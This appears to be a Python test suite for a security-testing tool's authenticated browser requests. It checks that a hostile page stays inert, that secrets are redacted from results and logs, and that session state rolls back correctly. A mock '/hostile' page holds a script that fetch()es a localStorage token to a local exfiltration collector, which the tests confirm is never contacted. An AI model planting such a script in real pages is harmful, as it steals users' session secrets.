from __future__ import annotations

from contextlib import contextmanager
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import json
import os
from pathlib import Path
import stat
import tempfile
import threading
import unittest
from urllib.parse import urlsplit
from unittest.mock import patch

from grypton import config, credentials, tools
from grypton.engine import Engine
from grypton.toolserver import REGISTRY, dispatch
from grypton.workspace import Constraints, Workspace


@contextmanager
def isolated_runtime():
    with tempfile.TemporaryDirectory() as directory:
        root = Path(directory)
        values = {
            "STATE_DIR": root / ".state",
            "ENGAGEMENTS_DIR": root / ".state/engagements",
            "TARGETS_DIR": root / ".state/engagements",
            "RUNTIME_DIR": root / ".state/runtime",
            "LOG_DIR": root / ".state/runtime/logs",
            "PROVIDER_DIR": root / ".state/providers",
            "CREDENTIALS_DIR": root / ".state/credentials",
            "OPENCODE_WORKSPACES_DIR": root / ".opencode-workspaces",
            "TARGET_DATA_DIR": root / "target",
        }
        with patch.multiple(config, **values):
            config.ensure_layout()
            yield root


class _ExfilHandler(BaseHTTPRequestHandler):
    requests = 0

    def do_GET(self):
        type(self).requests += 1
        self.send_response(204)
        self.send_header("Content-Length", "0")
        self.end_headers()

    def log_message(self, *_args):
        pass


class _BrowserRequestHandler(BaseHTTPRequestHandler):
    session = "request-session-never-log"
    rotated_session = "rotated-session-never-log"
    csrf = "csrf-local-never-log"
    nonce = "nonce-session-never-log"
    meta = "meta-token-never-log"
    form_token = "form-token-secret-123456"
    bearer_token = "bearer-response-secret-123456"
    basic_token = "YmFzaWMtc2VjcmV0LTEyMzQ1Ng=="
    html_credential = "html-credential-secret-123456"
    html_meta_token = "html-meta-secret-123456"
    rotated_token = "http-rotated-token-secret-123456"
    expired_echo = "expired-echo-cookie-secret-123456"
    authorization_echo = "authorization-echo-secret-123456"
    exfil_url = ""
    hostile_gets = 0
    bootstrap_network_gets = 0
    api_posts = 0
    redirect_gets = 0
    observed: list[dict] = []

    def _send(self, status: int, body: bytes, *, content_type: str,
              headers: tuple[tuple[str, str], ...] = ()) -> None:
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        for key, value in headers:
            self.send_header(key, value)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        path = urlsplit(self.path).path
        if path == "/hostile":
            if "__grypton_context__" in self.path:
                type(self).bootstrap_network_gets += 1
            type(self).hostile_gets += 1
            body = f"""<!doctype html>
            <meta name="request-meta" content="{type(self).meta}">
            <script>
              localStorage.setItem('csrf', 'hostile-script-ran');
              fetch('{type(self).exfil_url}?value=' + localStorage.getItem('csrf'));
            </script>""".encode()
            self._send(200, body, content_type="text/html; charset=utf-8")
            return
        if path == "/redirect":
            type(self).redirect_gets += 1
            destination = urlsplit(type(self).exfil_url)
            self.send_response(302)
            self.send_header(
                "Location",
                f"{destination.scheme}://location-user:location-password@"
                f"{destination.netloc}{destination.path}"
                "?code=redirect-secret-never-log",
            )
            self.send_header("Content-Length", "0")
            self.end_headers()
            return
        if path == "/http-rotate":
            self._send(
                200, b'{"ok":true}', content_type="application/json",
                headers=((
                    "Set-Cookie",
                    f"app_session={type(self).rotated_session}; HttpOnly; Path=/",
                ),),
            )
            return
        if path == "/http-cookie-attribute":
            self._send(
                200, b'{"ok":true}', content_type="application/json",
                headers=((
                    "Set-Cookie",
                    f"app_session={type(self).session}; HttpOnly; SameSite=Lax; Path=/",
                ),),
            )
            return
        if path == "/http-clear-site-data":
            self._send(
                200, b'{"ok":true}', content_type="application/json",
                headers=(("Clear-Site-Data", '"cookies", "storage"'),),
            )
            return
        if path == "/http-token-rotate":
            self._send(
                200,
                json.dumps({"access_token": type(self).rotated_token}).encode(),
                content_type="application/json",
            )
            return
        if path == "/plain-secrets":
            body = (
                f"token={type(self).form_token}&note=Authorization%3A+Bearer+"
                f"{type(self).bearer_token}\nAuthorization: Basic {type(self).basic_token}\n"
                f"<input type=hidden name=credential value='{type(self).html_credential}'>"
                f"<meta name='csrf-token' content='{type(self).html_meta_token}'>"
            ).encode()
            self._send(200, body, content_type="text/html; charset=utf-8")
            return
        if path == "/neutral-secret-echo":
            body = (
                f"values {type(self).expired_echo} "
                f"{type(self).authorization_echo}"
            ).encode()
            self._send(
                200, body, content_type="text/plain",
                headers=(
                    (
                        "Set-Cookie",
                        f"expired={type(self).expired_echo}; Max-Age=0; Path=/",
                    ),
                    (
                        "Authorization",
                        f"Bearer {type(self).authorization_echo}",
                    ),
                ),
            )
            return
        self._send(404, b"not found", content_type="text/plain")

    def do_POST(self):
        if urlsplit(self.path).path != "/api/action":
            self._send(404, b"not found", content_type="text/plain")
            return
        type(self).api_posts += 1
        row = {
            "cookie": self.headers.get("Cookie", ""),
            "csrf": self.headers.get("X-CSRF", ""),
            "nonce": self.headers.get("X-Nonce", ""),
            "meta": self.headers.get("X-Meta", ""),
        }
        type(self).observed.append(row)
        authenticated = (
            f"app_session={type(self).session}" in row["cookie"]
            and row["csrf"] == type(self).csrf
            and row["nonce"] == type(self).nonce
            and row["meta"] == type(self).meta
        )
        if not authenticated:
            self._send(401, b'{"error":"denied"}', content_type="application/json")
            return
        body = json.dumps({
            "tokens": ["fresh-secret-123456"],
            "jwt": "aaa.bbb.ccc",
            "oauth": {"code": "oauth-secret-123456"},
            "ok": True,
        }).encode()
        self._send(
            200, body, content_type="application/json",
            headers=(
                (
                    "Set-Cookie",
                    f"app_session={type(self).rotated_session}; HttpOnly; "
                    "SameSite=Strict; Path=/",
                ),
                (
                    "Set-Cookie",
                    "expired_cookie=expired-cookie-secret-never-log; Max-Age=0; Path=/",
                ),
            ),
        )

    def log_message(self, *_args):
        pass


class _UpgradeHandler(BaseHTTPRequestHandler):
    username = "legacy-user"
    password = "legacy-password-never-log"
    session = "legacy-session-never-log"
    login_posts = 0
    oversized_storage = False

    def _send(self, status: int, body: bytes, *, content_type: str,
              cookie: str = "") -> None:
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        if cookie:
            self.send_header("Set-Cookie", cookie)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _authenticated(self) -> bool:
        return f"app_session={type(self).session}" in self.headers.get("Cookie", "")

    def do_GET(self):
        path = urlsplit(self.path).path
        if path == "/login":
            storage_script = (
                "localStorage.setItem('opaque-session', 'oversized-private-' + "
                "'x'.repeat(65536));"
                if type(self).oversized_storage else ""
            )
            html = """<!doctype html><form id=f>
            <input data-testid=login-username><input data-testid=login-password type=password>
            <button data-testid=login-submit>Login</button></form><script>
            f.addEventListener('submit', async e => {e.preventDefault();
              const r = await fetch('/api/login', {method:'POST',headers:{'Content-Type':'application/json'},
              body:JSON.stringify({username:document.querySelector('[data-testid=login-username]').value,
              password:document.querySelector('[data-testid=login-password]').value})});
              if(r.ok) {__STORAGE__ location.assign('/home');}});</script>""".replace(
                "__STORAGE__", storage_script
            ).encode()
            self._send(200, html, content_type="text/html; charset=utf-8")
            return
        if path == "/home":
            self._send(
                200 if self._authenticated() else 401,
                b"home" if self._authenticated() else b"denied",
                content_type="text/plain",
            )
            return
        if path == "/verify":
            self._send(
                200 if self._authenticated() else 401,
                b'{"authenticated":true}' if self._authenticated()
                else b'{"authenticated":false}',
                content_type="application/json",
            )
            return
        self._send(404, b"not found", content_type="text/plain")

    def do_POST(self):
        if urlsplit(self.path).path != "/api/login":
            self._send(404, b"not found", content_type="text/plain")
            return
        type(self).login_posts += 1
        length = int(self.headers.get("Content-Length", "0"))
        try:
            value = json.loads(self.rfile.read(length))
        except ValueError:
            value = {}
        if value != {"username": self.username, "password": self.password}:
            self._send(401, b"denied", content_type="text/plain")
            return
        self._send(
            200, b'{"authenticated":true}', content_type="application/json",
            cookie=(
                f"app_session={type(self).session}; HttpOnly; SameSite=Strict; Path=/"
            ),
        )

    def log_message(self, *_args):
        pass


@contextmanager
def local_server(handler):
    server = ThreadingHTTPServer(("127.0.0.1", 0), handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        yield server.server_address[1]
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=2)


@unittest.skipUnless(tools._browser_executable(), "Chromium is unavailable")
class AuthenticatedBrowserRequestTests(unittest.TestCase):
    def setUp(self):
        _ExfilHandler.requests = 0
        _BrowserRequestHandler.hostile_gets = 0
        _BrowserRequestHandler.bootstrap_network_gets = 0
        _BrowserRequestHandler.api_posts = 0
        _BrowserRequestHandler.redirect_gets = 0
        _BrowserRequestHandler.observed = []
        _UpgradeHandler.login_posts = 0
        _UpgradeHandler.oversized_storage = False

    def _workspace(self, port: int, extra_origin: str = "") -> Workspace:
        origin = f"http://127.0.0.1:{port}"
        ws = Workspace("authenticated-browser-request")
        ws.create(origin, "web")
        scopes = [origin]
        if extra_origin:
            scopes.append(extra_origin)
        ws.save_constraints(Constraints(in_scope=scopes))
        return ws

    def _seed_rich_session(self, ws: Workspace, port: int) -> None:
        origin = f"http://127.0.0.1:{port}"
        credentials.save_credential(
            ws.slug, "primary", "private-user", "private-password-never-log"
        )
        profile = credentials.save_auth_profile(ws.slug, "primary", {
            "version": 1, "strategy": "browser",
            "login_url": origin + "/hostile",
            "verify_url": origin + "/hostile",
            "success_marker": "unused-marker",
            "username_transform": "stored", "timeout": 5,
            "browser": {
                "username_selector": "#username",
                "password_selector": "#password",
                "submit_selector": "#submit",
                "verify_headers": {},
            },
        })
        credentials.begin_login_attempt(ws.slug, "primary")
        credentials.record_login_outcome(
            ws.slug, "primary", established=True, origin=origin,
            profile_revision=credentials.auth_profile_revision(profile),
        )
        browser_cookies = [{
            "name": "app_session",
            "value": _BrowserRequestHandler.session,
            "domain": "127.0.0.1", "path": "/", "expires": -1,
            "httpOnly": True, "secure": False, "sameSite": "Strict",
        }]
        tools._browser_auth_install_cookies(
            ws, "primary", browser_cookies, origin
        )
        credentials.save_browser_storage(
            ws.slug, "primary", origin=origin,
            cookies=browser_cookies,
            local_storage={"csrf": _BrowserRequestHandler.csrf},
            session_storage={"nonce": _BrowserRequestHandler.nonce},
        )

    def test_private_state_fetch_is_inert_exact_and_redacted(self):
        with isolated_runtime(), local_server(_ExfilHandler) as exfil_port, \
                local_server(_BrowserRequestHandler) as port:
            exfil_origin = f"http://127.0.0.1:{exfil_port}"
            _BrowserRequestHandler.exfil_url = exfil_origin + "/collect"
            ws = self._workspace(port, exfil_origin)
            self._seed_rich_session(ws, port)

            result = dispatch(ws, "authenticated_browser_request", {
                "url": f"http://127.0.0.1:{port}/api/action",
                "page_url": f"http://127.0.0.1:{port}/a/../hostile",
                "credential": "primary", "method": "POST", "body": "{}",
                "headers": {"Content-Type": "application/json"},
                "header_sources": {
                    "X-CSRF": {"source": "localStorage", "name": "csrf"},
                    "X-Nonce": {"source": "sessionStorage", "name": "nonce"},
                    "X-Meta": {"source": "meta", "name": "request-meta"},
                },
            })

            self.assertTrue(result["ok"], result)
            self.assertEqual(result["data"]["status"], 200)
            self.assertEqual(_BrowserRequestHandler.hostile_gets, 1)
            self.assertEqual(_BrowserRequestHandler.bootstrap_network_gets, 0)
            self.assertEqual(_BrowserRequestHandler.api_posts, 1)
            self.assertEqual(_ExfilHandler.requests, 0)
            self.assertEqual(len(result["data"]["network_requests"]), 2)
            self.assertEqual(result["data"]["network_request_count"], 2)
            self.assertEqual(len(result["data"]["flows"]), 2)
            self.assertEqual(
                _BrowserRequestHandler.observed[0]["cookie"],
                f"app_session={_BrowserRequestHandler.session}",
            )
            self.assertEqual(
                _BrowserRequestHandler.observed[0]["csrf"],
                _BrowserRequestHandler.csrf,
            )
            stored = credentials.load_browser_storage(ws.slug, "primary")
            cookie = next(item for item in stored["cookies"]
                          if item["name"] == "app_session")
            self.assertTrue(cookie["httpOnly"])
            self.assertEqual(cookie["sameSite"], "Strict")
            self.assertEqual(cookie["value"], _BrowserRequestHandler.rotated_session)
            self.assertEqual(
                stat.S_IMODE(os.stat(
                    credentials.browser_storage_path(ws.slug, "primary")
                ).st_mode),
                0o600,
            )

            observable = json.dumps(result, ensure_ascii=False)
            observable += (ws.root / ".ledger/tool-calls.jsonl").read_text()
            observable += "".join(
                path.read_text(errors="replace") for path in ws.flows_dir.glob("*.http")
            )
            for secret in (
                _BrowserRequestHandler.session,
                _BrowserRequestHandler.rotated_session,
                _BrowserRequestHandler.csrf,
                _BrowserRequestHandler.nonce,
                _BrowserRequestHandler.meta,
                "fresh-secret-123456", "aaa.bbb.ccc", "oauth-secret-123456",
                "expired-cookie-secret-never-log",
            ):
                self.assertNotIn(secret, observable)
            effects = (ws.root / ".ledger/effectful-tool-starts.jsonl").read_text()
            self.assertIn("authenticated_browser_request", effects)

            invisible = dispatch(ws, "authenticated_browser_request", {
                "url": f"http://127.0.0.1:{port}/api/action",
                "page_url": f"http://127.0.0.1:{port}/hostile",
                "credential": "primary", "method": "POST", "body": "{}",
                "header_sources": {
                    "X-Leak": {"source": "cookie", "name": "app_session"},
                },
            })
            self.assertFalse(invisible["ok"], invisible)
            self.assertEqual(
                invisible["data"]["missing_header_sources"], ["X-Leak"]
            )
            self.assertEqual(_BrowserRequestHandler.api_posts, 1)

    def test_redirect_is_captured_without_cross_origin_follow(self):
        with isolated_runtime(), local_server(_ExfilHandler) as exfil_port, \
                local_server(_BrowserRequestHandler) as port:
            exfil_origin = f"http://127.0.0.1:{exfil_port}"
            _BrowserRequestHandler.exfil_url = exfil_origin + "/collect"
            ws = self._workspace(port, exfil_origin)
            self._seed_rich_session(ws, port)

            result = dispatch(ws, "authenticated_browser_request", {
                "url": f"http://127.0.0.1:{port}/redirect",
                "page_url": f"http://127.0.0.1:{port}/hostile",
                "credential": "primary",
            })

            self.assertTrue(result["ok"], result)
            self.assertEqual(result["data"]["status"], 302)
            self.assertEqual(_BrowserRequestHandler.redirect_gets, 1)
            self.assertEqual(_ExfilHandler.requests, 0)
            observable = json.dumps(result, ensure_ascii=False) + "".join(
                path.read_text(errors="replace") for path in ws.flows_dir.glob("*.http")
            )
            for secret in (
                "redirect-secret-never-log", "location-user", "location-password",
            ):
                self.assertNotIn(secret, observable)

    def _upgrade_profile(self, port: int) -> dict:
        origin = f"http://127.0.0.1:{port}"
        return {
            "version": 1, "strategy": "browser",
            "login_url": origin + "/login", "verify_url": origin + "/verify",
            "username_transform": "stored", "timeout": 5,
            "browser": {
                "username_selector": "[data-testid='login-username']",
                "password_selector": "[data-testid='login-password']",
                "submit_selector": "[data-testid='login-submit']",
                "verify_headers": {},
                "verification": {
                    "mode": "status-differential", "login_status": 200,
                    "authenticated_status": 200, "anonymous_status": 401,
                    "expected_post_login_url": origin + "/home",
                },
            },
        }

    def _seed_legacy_session(self, ws: Workspace, port: int) -> dict:
        origin = f"http://127.0.0.1:{port}"
        credentials.save_credential(
            ws.slug, "primary", _UpgradeHandler.username, _UpgradeHandler.password
        )
        profile = credentials.save_auth_profile(
            ws.slug, "primary", self._upgrade_profile(port)
        )
        credentials.begin_login_attempt(ws.slug, "primary")
        tools._browser_auth_install_cookies(ws, "primary", [{
            "name": "app_session", "value": _UpgradeHandler.session,
            "domain": "127.0.0.1", "path": "/", "expires": -1,
            "httpOnly": True, "secure": False, "sameSite": "Strict",
        }], origin)
        credentials.record_login_outcome(
            ws.slug, "primary", established=True, origin=origin,
            profile_revision=credentials.auth_profile_revision(profile),
        )
        return profile

    def test_legacy_state_requires_explicit_single_upgrade(self):
        with isolated_runtime(), local_server(_UpgradeHandler) as port:
            ws = self._workspace(port)
            self._seed_legacy_session(ws, port)

            missing = dispatch(ws, "authenticated_browser_request", {
                "url": f"http://127.0.0.1:{port}/verify",
                "credential": "primary",
            })
            self.assertFalse(missing["ok"], missing)
            self.assertTrue(missing["data"]["migration_required"])
            self.assertEqual(_UpgradeHandler.login_posts, 0)

            for malformed in ("false", 1, {"yes": True}):
                rejected = dispatch(ws, "credential_browser_login", {
                    "credential": "primary", "upgrade_browser_state": malformed,
                })
                self.assertFalse(rejected["ok"], rejected)
                self.assertIn("literal boolean", rejected["summary"])
            self.assertEqual(_UpgradeHandler.login_posts, 0)

            upgraded = dispatch(ws, "credential_browser_login", {
                "credential": "primary", "upgrade_browser_state": True,
            })
            self.assertTrue(upgraded["ok"], upgraded)
            self.assertEqual(_UpgradeHandler.login_posts, 1)
            self.assertTrue(
                credentials.load_browser_storage(ws.slug, "primary")["available"]
            )
            again = dispatch(ws, "credential_browser_login", {
                "credential": "primary", "upgrade_browser_state": True,
            })
            self.assertTrue(again["ok"], again)
            self.assertEqual(_UpgradeHandler.login_posts, 1)

    def test_refresh_storage_write_failure_restores_transaction(self):
        with isolated_runtime(), local_server(_UpgradeHandler) as port:
            ws = self._workspace(port)
            profile = self._seed_legacy_session(ws, port)
            before_jar = credentials.cookie_jar_storage_path(
                ws.slug, "primary"
            ).read_bytes()
            generation = credentials.load_attempt_state(
                ws.slug, "primary"
            )["proof_generation"]
            credentials.record_session_stale(
                ws.slug, "primary", generation=generation,
                profile_revision=credentials.auth_profile_revision(profile),
            )
            browser = profile["browser"]
            with patch(
                "grypton.credentials.save_browser_storage",
                side_effect=OSError("synthetic private write failure"),
            ):
                result = tools._credential_browser_login_locked(
                    ws, profile["login_url"], credential="primary",
                    username_transform=profile["username_transform"],
                    username_selector=browser["username_selector"],
                    password_selector=browser["password_selector"],
                    submit_selector=browser["submit_selector"],
                    verify_url=profile["verify_url"], success_marker="",
                    verify_headers=browser["verify_headers"],
                    verification=browser["verification"], timeout=5,
                    _refresh_generation=generation,
                    _profile_revision=credentials.auth_profile_revision(profile),
                )

            self.assertFalse(result["ok"], result)
            state = credentials.load_attempt_state(ws.slug, "primary")
            self.assertFalse(state["established"])
            self.assertEqual(state["proof_generation"], generation)
            self.assertEqual(state["refresh_attempted_generation"], generation)
            self.assertEqual(
                credentials.cookie_jar_storage_path(
                    ws.slug, "primary"
                ).read_bytes(),
                before_jar,
            )
            self.assertFalse(
                credentials.load_browser_storage(ws.slug, "primary")["available"]
            )
            self.assertEqual(_UpgradeHandler.login_posts, 1)

    def test_schema_and_network_signature_include_browser_request(self):
        description, schema, _ = REGISTRY["authenticated_browser_request"]
        self.assertIn("authenticated browser context", description)
        self.assertEqual(schema["required"], ["url", "credential"])
        self.assertEqual(
            schema["properties"]["header_sources"]["additionalProperties"]
            ["properties"]["source"]["enum"],
            ["localStorage", "sessionStorage", "cookie", "meta"],
        )
        signature = Engine._network_signature({
            "name": "grypton_authenticated_browser_request",
            "input": {"method": "POST", "url": "https://example.test/api?a=1"},
        })
        self.assertTrue(signature)
        implicit_get = Engine._network_signature({
            "name": "grypton_authenticated_browser_request",
            "input": {"url": "https://example.test/api?a=1"},
        })
        explicit_get = Engine._network_signature({
            "name": "grypton_authenticated_browser_request",
            "input": {"method": "GET", "url": "https://example.test/api?a=1"},
        })
        self.assertEqual(implicit_get, explicit_get)
        nonce = "normalized-bootstrap-nonce"
        self.assertTrue(tools._browser_inert_bootstrap_matches(
            f"HTTP://EXAMPLE.TEST:80/hostile?__grypton_context__={nonce}",
            method="GET", resource_type="document",
            origin=credentials.normalize_origin("http://example.test"), nonce=nonce,
        ))

    def test_storage_only_rich_session_is_reusable_material(self):
        with isolated_runtime(), local_server(_BrowserRequestHandler) as port:
            ws = self._workspace(port)
            origin = f"http://127.0.0.1:{port}"
            credentials.save_credential(
                ws.slug, "primary", "private-user", "private-password-never-log"
            )
            credentials.begin_login_attempt(ws.slug, "primary")
            credentials.record_login_outcome(
                ws.slug, "primary", established=True, origin=origin
            )
            credentials.save_browser_storage(
                ws.slug, "primary", origin=origin, cookies=[],
                local_storage={"opaque_session": "storage-only-never-log"},
                session_storage={},
            )
            state = credentials.load_attempt_state(ws.slug, "primary")
            self.assertFalse(tools._browser_session_revalidation_due(
                ws, "primary", state, ""
            ))

    def test_http_cookie_rotation_invalidates_rich_browser_state(self):
        with isolated_runtime(), local_server(_BrowserRequestHandler) as port:
            ws = self._workspace(port)
            self._seed_rich_session(ws, port)
            storage_path = credentials.browser_storage_path(ws.slug, "primary")
            self.assertTrue(storage_path.exists())

            result = dispatch(ws, "authenticated_http_request", {
                "url": f"http://127.0.0.1:{port}/http-rotate",
                "credential": "primary",
            })

            self.assertTrue(result["ok"], result)
            self.assertFalse(storage_path.exists())
            self.assertFalse(
                credentials.load_browser_storage(ws.slug, "primary")["available"]
            )
            self.assertIn(
                _BrowserRequestHandler.rotated_session,
                credentials.cookie_jar_storage_path(
                    ws.slug, "primary"
                ).read_text(encoding="utf-8"),
            )

    def test_http_token_rotation_invalidates_rich_browser_state(self):
        with isolated_runtime(), local_server(_BrowserRequestHandler) as port:
            ws = self._workspace(port)
            self._seed_rich_session(ws, port)
            storage_path = credentials.browser_storage_path(ws.slug, "primary")

            result = dispatch(ws, "authenticated_http_request", {
                "url": f"http://127.0.0.1:{port}/http-token-rotate",
                "credential": "primary",
            })

            self.assertTrue(result["ok"], result)
            self.assertFalse(storage_path.exists())
            self.assertEqual(
                credentials.load_tokens(ws.slug, "primary").get("access_token"),
                _BrowserRequestHandler.rotated_token,
            )
            observable = json.dumps(result, ensure_ascii=False) + "".join(
                path.read_text(errors="replace")
                for path in ws.flows_dir.glob("*.http")
            )
            self.assertNotIn(_BrowserRequestHandler.rotated_token, observable)

    def test_http_browser_semantic_headers_invalidate_rich_state(self):
        for route in ("/http-cookie-attribute", "/http-clear-site-data"):
            with self.subTest(route=route), isolated_runtime(), \
                    local_server(_BrowserRequestHandler) as port:
                ws = self._workspace(port)
                self._seed_rich_session(ws, port)
                jar = credentials.cookie_jar_storage_path(ws.slug, "primary")
                digest_before = credentials.cookie_jar_digest(jar)

                result = dispatch(ws, "authenticated_http_request", {
                    "url": f"http://127.0.0.1:{port}{route}",
                    "credential": "primary",
                })

                self.assertTrue(result["ok"], result)
                self.assertFalse(
                    credentials.browser_storage_path(
                        ws.slug, "primary"
                    ).exists()
                )
                if route == "/http-cookie-attribute":
                    self.assertEqual(
                        credentials.cookie_jar_digest(jar), digest_before,
                        "attribute-only Set-Cookie should exercise presence invalidation",
                    )

    def test_special_storage_keys_round_trip_and_headers_fail_closed(self):
        with isolated_runtime(), local_server(_BrowserRequestHandler) as port:
            ws = self._workspace(port)
            self._seed_rich_session(ws, port)
            origin = f"http://127.0.0.1:{port}"
            rich = credentials.load_browser_storage(ws.slug, "primary")
            credentials.save_browser_storage(
                ws.slug, "primary", origin=origin, cookies=rich["cookies"],
                local_storage={
                    "__proto__": _BrowserRequestHandler.csrf,
                    "constructor": "constructor-private-value",
                },
                session_storage={
                    "__proto__": _BrowserRequestHandler.nonce,
                    "prototype": "prototype-private-value",
                },
            )

            result = dispatch(ws, "authenticated_browser_request", {
                "url": origin + "/api/action", "page_url": origin + "/hostile",
                "credential": "primary", "method": "POST", "body": "{}",
                "headers": {"X-Meta": _BrowserRequestHandler.meta},
                "header_sources": {
                    "X-CSRF": {"source": "localStorage", "name": "__proto__"},
                    "X-Nonce": {"source": "sessionStorage", "name": "__proto__"},
                },
            })
            self.assertTrue(result["ok"], result)
            stored = credentials.load_browser_storage(ws.slug, "primary")
            self.assertEqual(
                stored["local_storage"]["__proto__"],
                _BrowserRequestHandler.csrf,
            )
            self.assertEqual(
                stored["session_storage"]["__proto__"],
                _BrowserRequestHandler.nonce,
            )
            self.assertEqual(
                stored["local_storage"]["constructor"],
                "constructor-private-value",
            )
            self.assertEqual(
                stored["session_storage"]["prototype"],
                "prototype-private-value",
            )

            posts = _BrowserRequestHandler.api_posts
            bad_calls = (
                {"headers": {"__proto__": "value"}},
                {"header_sources": {
                    "__proto__": {
                        "source": "localStorage", "name": "__proto__",
                    },
                }},
            )
            for bad in bad_calls:
                args = {
                    "url": origin + "/api/action", "page_url": origin + "/hostile",
                    "credential": "primary", "method": "POST", "body": "{}",
                    **bad,
                }
                rejected = dispatch(ws, "authenticated_browser_request", args)
                self.assertFalse(rejected["ok"], rejected)
                self.assertIn("reserved object property", rejected["summary"])
            self.assertEqual(_BrowserRequestHandler.api_posts, posts)

    def test_non_json_response_secrets_are_redacted(self):
        with isolated_runtime(), local_server(_BrowserRequestHandler) as port:
            ws = self._workspace(port)
            self._seed_rich_session(ws, port)

            result = dispatch(ws, "authenticated_browser_request", {
                "url": f"http://127.0.0.1:{port}/plain-secrets",
                "page_url": f"http://127.0.0.1:{port}/hostile",
                "credential": "primary",
            })

            self.assertTrue(result["ok"], result)
            observable = json.dumps(result, ensure_ascii=False) + "".join(
                path.read_text(errors="replace")
                for path in ws.flows_dir.glob("*.http")
            )
            for secret in (
                _BrowserRequestHandler.form_token,
                _BrowserRequestHandler.bearer_token,
                _BrowserRequestHandler.basic_token,
                _BrowserRequestHandler.html_credential,
                _BrowserRequestHandler.html_meta_token,
            ):
                self.assertNotIn(secret, observable)

    def test_sensitive_header_components_redact_neutral_echoes(self):
        with isolated_runtime(), local_server(_BrowserRequestHandler) as port:
            ws = self._workspace(port)
            self._seed_rich_session(ws, port)

            result = dispatch(ws, "authenticated_browser_request", {
                "url": f"http://127.0.0.1:{port}/neutral-secret-echo",
                "page_url": f"http://127.0.0.1:{port}/hostile",
                "credential": "primary",
            })

            self.assertTrue(result["ok"], result)
            observable = json.dumps(result, ensure_ascii=False) + "".join(
                path.read_text(errors="replace")
                for path in ws.flows_dir.glob("*.http")
            )
            self.assertNotIn(_BrowserRequestHandler.expired_echo, observable)
            self.assertNotIn(_BrowserRequestHandler.authorization_echo, observable)

    def test_profile_revision_change_blocks_browser_request(self):
        with isolated_runtime(), local_server(_BrowserRequestHandler) as port:
            ws = self._workspace(port)
            self._seed_rich_session(ws, port)
            profile = credentials.load_auth_profile_optional(ws.slug, "primary")
            self.assertIsInstance(profile, dict)
            profile["timeout"] = 6
            credentials.save_auth_profile(ws.slug, "primary", profile)

            result = dispatch(ws, "authenticated_browser_request", {
                "url": f"http://127.0.0.1:{port}/api/action",
                "page_url": f"http://127.0.0.1:{port}/hostile",
                "credential": "primary", "method": "POST", "body": "{}",
            })

            self.assertFalse(result["ok"], result)
            self.assertIn("profile changed", result["summary"])
            self.assertEqual(_BrowserRequestHandler.api_posts, 0)

    def test_revalidation_does_not_reopen_failed_upgrade_generation(self):
        with isolated_runtime(), local_server(_UpgradeHandler) as port:
            ws = self._workspace(port)
            profile = self._seed_legacy_session(ws, port)
            revision = credentials.auth_profile_revision(profile)
            origin = f"http://127.0.0.1:{port}"
            generation = credentials.load_attempt_state(
                ws.slug, "primary"
            )["proof_generation"]

            credentials.begin_browser_state_upgrade(
                ws.slug, "primary", generation=generation
            )
            credentials.record_browser_state_upgrade_outcome(
                ws.slug, "primary", generation=generation
            )
            credentials.record_session_revalidated(
                ws.slug, "primary", generation=generation,
                origin=origin, profile_revision=revision,
            )

            state = credentials.load_attempt_state(ws.slug, "primary")
            self.assertEqual(state["proof_generation"], generation)
            self.assertEqual(state["refresh_attempted_generation"], generation)
            with self.assertRaises(credentials.CredentialError):
                credentials.begin_browser_state_upgrade(
                    ws.slug, "primary", generation=generation
                )

    def test_oversized_browser_storage_fails_without_partial_commit(self):
        with isolated_runtime(), local_server(_UpgradeHandler) as port:
            ws = self._workspace(port)
            self._seed_legacy_session(ws, port)
            before = credentials.load_attempt_state(ws.slug, "primary")
            _UpgradeHandler.oversized_storage = True

            result = dispatch(ws, "credential_browser_login", {
                "credential": "primary", "upgrade_browser_state": True,
            })

            self.assertFalse(result["ok"], result)
            self.assertIn("storage capture", result["summary"].lower())
            after = credentials.load_attempt_state(ws.slug, "primary")
            self.assertTrue(after["established"])
            self.assertEqual(after["proof_generation"], before["proof_generation"])
            self.assertEqual(
                after["refresh_attempted_generation"], before["proof_generation"]
            )
            self.assertFalse(
                credentials.load_browser_storage(ws.slug, "primary")["available"]
            )
            self.assertEqual(_UpgradeHandler.login_posts, 1)


if __name__ == "__main__":
    unittest.main()
